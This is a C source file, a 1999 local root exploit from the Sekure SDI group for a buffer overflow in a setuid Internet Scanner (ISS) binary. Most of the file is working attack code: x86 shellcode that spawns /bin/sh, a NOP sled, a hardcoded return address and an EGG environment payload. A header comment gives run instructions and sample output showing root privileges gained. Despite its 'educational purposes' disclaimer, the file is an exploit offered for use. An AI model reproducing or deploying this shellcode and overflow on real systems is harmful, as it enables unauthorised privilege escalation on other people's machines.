/* 
 *  Sekure SDI - http://www.sekure.org  
 *  Brazilian Information Security Team  
 *  By c0nd0r <condor@sekure.org>
 *
 *  . ..Internet Scanner (ISS) Buffer Overflow.. .  
 *  (read the original advisory at http://www.sekure.org/advisory.html)
 *    
 *  > This may not represent a thread if you are
 *  > NOT using IS with setuid root
 *
 *  This code is only for educational purposes.
 *  ------------------------------
 *  Instructions: After the compilation, execute it to get 
 *  a shell prompt with the $EGG in the environment.
 *  tiazinha:~$ SDI-iss
 *  bash$ ls -tarl iss
 *  -rwsr-xr-x   1 root     daemon    1691180 Dec 10 15:22 iss*
 *  bash$ ./iss -c $EGG   
 *  
 *  Creating Directory /usr/local/iss/scans/s.199903261158
 *  id;
 *  uid=666(condor) gid=100(deejay) euid=0(root) groups=12(mail)
 *  -------------------------------
 *  PS: the i/o descriptors are used by IS (stdin/stdout) as this is 
 *  just an example, I'll not worry about. 
 */

char shellcode[]=
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

#define ISS_HOME "/usr/local/iss"

main ( int argc, char *argv[]) {
  char buff[2048], env[250];
  long addr;
  int x, y, offset=0, src;

  if (argc > 1) offset = atoi(argv[1]);

  for ( x = 0; x < (238-strlen(shellcode)); x++) 
    buff[x] = 0x90;

  for ( y = 0; y < strlen(shellcode); y++, x++)
    buff[x] = shellcode[y];

  addr = (long) &src + offset;
  printf ( "SDI I.S. Exploit Code\n");
  printf ( "4 educational purpose only\n");
  printf ( "Please, go to ISS directory and run:\n");
  printf ( "./iss -c $EGG\n\n");

  /* the program mess with the stack so I prefer to set it 
     by my own hands, no prob, just a little bit different */
  
  buff [x++] = 0x60; 
  buff [x++] = 0xef; 
  buff [x++] = 0xff; 
  buff [x++] = 0xbf; 
  /* it works fine in my slak3.5 box */

  buff[strlen(buff)] = '\0';

  snprintf ( env, sizeof(env), "ISS_HOME=%s", ISS_HOME); 
  putenv ( env);
  bzero ( &env, sizeof(env));

  snprintf ( env, sizeof(env), "EGG=%s", buff);
  putenv ( env);
  system ( "/bin/sh");

}

